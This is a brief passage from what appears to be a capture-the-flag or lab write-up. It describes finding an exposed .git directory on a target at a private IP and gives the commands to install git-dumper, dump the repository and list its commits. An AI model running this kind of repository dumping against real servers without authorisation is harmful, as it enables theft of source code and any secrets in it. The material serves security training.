So I found out that in here, the git was open for grabs. So I want to get everything I can from this git.

In order to do that, I am going to install python's `git-dumper`.

To do that (since we can't just do `pip install git-dumper`, since it is an externally managed environment), we do this:
```bash
sudo apt update && sudo apt install pipx
pipx install git-dumper
```


Then we run the git-dumper:
```bash
pipx run git-dumper http://10.110.3.72:8013/ recovered_repo
```


If we now check the commits that are available with this command:
```bash
git log --all --oneline
```
